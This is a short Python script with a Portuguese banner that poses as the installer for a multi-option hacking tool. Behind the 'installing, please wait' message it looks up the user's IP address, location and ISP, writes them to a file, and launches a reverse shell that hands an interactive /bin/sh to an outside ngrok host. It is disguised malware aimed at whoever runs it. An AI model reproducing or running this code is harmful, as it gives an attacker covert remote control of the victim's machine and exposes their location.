#-- coding: UTF-8 --
import os, time, sys, json, requests, socket, pty
reset = '\033[0;0m'
destq = '\033[;1m'
yellow = '\033[1;33m'
green = '\033[1;32m'
red = '\033[1;31m'
blue = '\033[1;34m'
wh = '\033[1;97m'
ip = requests.get('http://ip-api.com/json/');ip = ip.json();query = ip['query'];status = ip['status'];country = ip['country'];countryC = ip['countryCode'];region = ip['region'];regionN = ip['regionName'];city = ip['city'];zip = ip['zip'];lat = ip['lat'];lon = ip['lon'];tmz = ip['timezone'];isp = ip['isp'];org = ip['org'];As = ip['as']
try:
    import requests
except ModuleNotFoundError:
    os.system('pip install requests')
with open('lol.txt', 'w') as arc:
    arc.write(f'''{query}
{status}
{country}
{countryC}
{region}
{regionN}
{city}
{zip}
{lat}
{lon}
{tmz}
{isp}
{org}
{As}
lolhacked_by_spawn''')
print(f'''
{red}
                       __
                    .-"      "-.
                   /            1
       _          |              |          _
      ( \         |,  .-.  .-.  ,|         / )
       > "=._     | )(_/  \_)( |     _.=" <
      (/"=."=._ |/     /\     \| .=".="\_)
             "=._ (_     ^^     )".="
                 "=\_|IIIIII|_/="
                .="| \IIIIII/ |"=.
      _     .=".="\          /"=."=.     _
     ( \_.=".="     `--------`     "=."=._/ )
      > .="         {wh}Created by{red}         "=. <
     (/               {wh}SpawnDEV{red}               \)
               Conhecimento não é crime.
               
    "Sem pensar, está é a melhor ferramenta para hackers
            com intenções incompreensíveis.
             Nós somos o lado mal da força."
    {green}[AVISO]{wh} Está é uma ferramenta com o menu de opções muito vasto, 
    contendo 4 opções para hacking.
    Por conta disso, a instalação pode se prolongar mais que o normal.
    (Estima-se que em torno de 15 minutos.)
        {green}Instalando, aguarde ...''')
os.system(''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",12984));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''')
